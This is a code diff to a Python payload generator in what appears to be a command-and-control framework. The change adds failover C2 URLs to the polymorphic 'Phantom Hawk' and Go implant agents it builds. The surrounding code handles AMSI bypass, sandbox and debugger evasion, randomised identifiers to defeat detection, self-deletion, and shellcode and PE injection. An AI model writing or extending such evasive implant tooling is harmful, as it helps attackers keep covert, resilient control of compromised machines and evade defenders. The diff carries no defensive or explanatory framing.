@@ -77,7 +77,7 @@ class PayloadGenerator:
     def _generate_fernet_key(self):
         return Fernet.generate_key().decode()
 
-    def generate_payload(self, listener_id, payload_type, obfuscate=False, bypass_amsi=False, disable_sandbox=False, platform='windows', use_redirector=False):
+    def generate_payload(self, listener_id, payload_type, obfuscate=False, bypass_amsi=False, disable_sandbox=False, platform='windows', use_redirector=False, use_failover=False):
         print(f"[DEBUG] Generating POLYMORPHIC payload for listener_id: {listener_id}")
 
         listener = self.db.get_listener(listener_id)
@@ -153,19 +153,24 @@ class PayloadGenerator:
             "days": [1, 2, 3, 4, 5]  # Monday to Friday
         })
 
+        # Extract failover URLs from profile_config if use_failover is enabled
+        failover_urls = profile_config.get('failover_urls', []) if use_failover else []
+
         print(f"[+] Generating polymorphic variant")
         if payload_type == "phantom_hawk_agent":
             return self._generate_phantom_hawk_agent(
-                agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox, kill_date=kill_date, working_hours=working_hours, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port
+                agent_id, secret_key, c2_server_url, profile_config, obfuscate, disable_sandbox=disable_sandbox, kill_date=kill_date, working_hours=working_hours, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls
             )
         elif payload_type == "go_agent":
             return self._generate_go_agent(
-                agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port
+                agent_id, secret_key, c2_server_url, profile_config, disable_sandbox=disable_sandbox, platform=platform, use_redirector=use_redirector, redirector_host=redirector_host, redirector_port=redirector_port, use_failover=use_failover, failover_urls=failover_urls
             )
         else:
             raise ValueError(f"Unsupported payload type: {payload_type}")
 
-    def _generate_phantom_hawk_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate, disable_sandbox=False, kill_date='2025-12-31T23:59:59Z', working_hours=None, use_redirector=False, redirector_host='0.0.0.0', redirector_port=80):
+    def _generate_phantom_hawk_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate, disable_sandbox=False, kill_date='2025-12-31T23:59:59Z', working_hours=None, use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None):
+        if failover_urls is None:
+            failover_urls = []
         if working_hours is None:
             working_hours = {
                 "start_hour": 9,
@@ -212,6 +217,11 @@ class PayloadGenerator:
         m_check_debuggers = poly.generate_random_name('check_debuggers_')
         m_check_network_tools = poly.generate_random_name('check_network_tools_')
         m_self_delete = poly.generate_random_name('self_delete_')
+
+        # Failover method names
+        m_try_failover = poly.generate_random_name('try_failover_')
+        m_increment_fail_count = poly.generate_random_name('increment_fail_count_')
+        m_reset_fail_count = poly.generate_random_name('reset_fail_count_')
 
         m_handle_upload = poly.generate_random_name('handle_upload_')
         m_handle_download = poly.generate_random_name('handle_download_')
@@ -272,6 +282,13 @@ class PayloadGenerator:
         v_redirector_host = poly.generate_random_name('redirector_host_')
         v_redirector_port = poly.generate_random_name('redirector_port_')
         v_use_redirector = poly.generate_random_name('use_redirector_')
+
+        # Failover variables
+        v_use_failover = poly.generate_random_name('use_failover_')
+        v_failover_urls = poly.generate_random_name('failover_urls_')
+        v_current_c2_url = poly.generate_random_name('current_c2_url_')
+        v_current_fail_count = poly.generate_random_name('current_fail_count_')
+        v_max_fail_count = poly.generate_random_name('max_fail_count_')
 
         v_coffloader_b64 = poly.generate_random_name('coffloader_b64_')
 
@@ -334,6 +351,9 @@ class PayloadGenerator:
             m_check_debuggers=m_check_debuggers,
             m_check_network_tools=m_check_network_tools,
             m_self_delete=m_self_delete,
+            m_try_failover=m_try_failover,
+            m_increment_fail_count=m_increment_fail_count,
+            m_reset_fail_count=m_reset_fail_count,
             m_handle_upload=m_handle_upload,
             m_handle_download=m_handle_download,
             m_start_direct_shell=m_start_direct_shell,
@@ -389,6 +409,11 @@ class PayloadGenerator:
             v_redirector_host=v_redirector_host,
             v_redirector_port=v_redirector_port,
             v_use_redirector=v_use_redirector,
+            v_use_failover=v_use_failover,
+            v_failover_urls=v_failover_urls,
+            v_current_c2_url=v_current_c2_url,
+            v_current_fail_count=v_current_fail_count,
+            v_max_fail_count=v_max_fail_count,
             v_kill_date=v_kill_date,
             v_working_hours=v_working_hours,
             kill_date=kill_date,
@@ -409,14 +434,18 @@ class PayloadGenerator:
             secret_key=secret_key,
             redirector_host=redirector_host,
             redirector_port=redirector_port,
-            use_redirector=str(use_redirector).lower().capitalize()
+            use_redirector=str(use_redirector).lower().capitalize(),
+            use_failover=str(use_failover).lower().capitalize(),
+            failover_urls=failover_urls
         )
 
         print(f"[+] POLYMORPHIC Phantom Hawk agent generated (Class: {class_name})")
         return agent_template.strip()
 
 
-    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, redirector_host='0.0.0.0', redirector_port=80):
+    def _generate_go_agent(self, agent_id, secret_key, c2_url, profile_config, obfuscate=False, disable_sandbox=False, platform='windows', use_redirector=False, redirector_host='0.0.0.0', redirector_port=80, use_failover=False, failover_urls=None):
+        if failover_urls is None:
+            failover_urls = []
         import subprocess
         import os
         import tempfile
@@ -503,6 +532,19 @@ class PayloadGenerator:
         agent_inject_shellcode_func = poly.generate_random_name('injectShellcode')
         agent_inject_pe_func = poly.generate_random_name('injectPE')
 
+        # Generate random names for failover functions
+        agent_try_failover_func = poly.generate_random_name('tryFailover')
+        agent_increment_fail_count_func = poly.generate_random_name('incrementFailCount')
+        agent_reset_fail_count_func = poly.generate_random_name('resetFailCount')
+
+        # Generate random names for new failover fields
+        agent_failover_urls_field = poly.generate_go_field_name('FailoverURLs')
+        agent_use_failover_field = poly.generate_go_field_name('UseFailover')
+        agent_current_c2_url_field = poly.generate_go_field_name('CurrentC2URL')
+        agent_current_fail_count_field = poly.generate_go_field_name('CurrentFailCount')
+        agent_max_fail_count_field = poly.generate_go_field_name('MaxFailCount')
+        agent_last_connection_attempt_field = poly.generate_go_field_name('LastConnectionAttempt')
+
         template_path = os.path.join(os.path.dirname(__file__), 'go_agent_template.go')
         with open(template_path, 'r') as f:
             go_template = f.read()
@@ -574,6 +616,19 @@ class PayloadGenerator:
         go_code = go_code.replace('{AGENT_INJECT_SHELLCODE_FUNC}', agent_inject_shellcode_func)
         go_code = go_code.replace('{AGENT_INJECT_PE_FUNC}', agent_inject_pe_func)
 
+        # Replace failover function names
+        go_code = go_code.replace('{AGENT_TRY_FAILOVER_FUNC}', agent_try_failover_func)
+        go_code = go_code.replace('{AGENT_INCREMENT_FAIL_COUNT_FUNC}', agent_increment_fail_count_func)
+        go_code = go_code.replace('{AGENT_RESET_FAIL_COUNT_FUNC}', agent_reset_fail_count_func)
+
+        # Replace failover field names
+        go_code = go_code.replace('{AGENT_FAILOVER_URLS_FIELD}', agent_failover_urls_field)
+        go_code = go_code.replace('{AGENT_USE_FAILOVER_FIELD}', agent_use_failover_field)
+        go_code = go_code.replace('{AGENT_CURRENT_C2_URL_FIELD}', agent_current_c2_url_field)
+        go_code = go_code.replace('{AGENT_CURRENT_FAIL_COUNT_FIELD}', agent_current_fail_count_field)
+        go_code = go_code.replace('{AGENT_MAX_FAIL_COUNT_FIELD}', agent_max_fail_count_field)
+        go_code = go_code.replace('{AGENT_LAST_CONNECTION_ATTEMPT_FIELD}', agent_last_connection_attempt_field)
+
         # Extract kill_date and working_hours from profile_config
         kill_date = profile_config.get('kill_date', '2025-12-31T23:59:59Z')
         working_hours = profile_config.get('working_hours', {
@@ -601,6 +656,16 @@ class PayloadGenerator:
         go_code = go_code.replace('{REDIRECTOR_HOST}', redirector_host)
         go_code = go_code.replace('{REDIRECTOR_PORT}', str(redirector_port))
         go_code = go_code.replace('{USE_REDIRECTOR}', 'true' if use_redirector else 'false')
+
+        # Replace failover URLs placeholder
+        if use_failover and failover_urls:
+            # Convert the failover URLs list to a Go array literal
+            go_failover_urls = ', '.join([f'"{url}"' for url in failover_urls])
+            go_code = go_code.replace('{FAILOVER_URLS}', f'[]string{{{go_failover_urls}}}')
+            go_code = go_code.replace('{USE_FAILOVER}', 'true')
+        else:
+            go_code = go_code.replace('{FAILOVER_URLS}', '[]string{}')
+            go_code = go_code.replace('{USE_FAILOVER}', 'false')
 
         logs_dir = 'logs'
         if not os.path.exists(logs_dir):
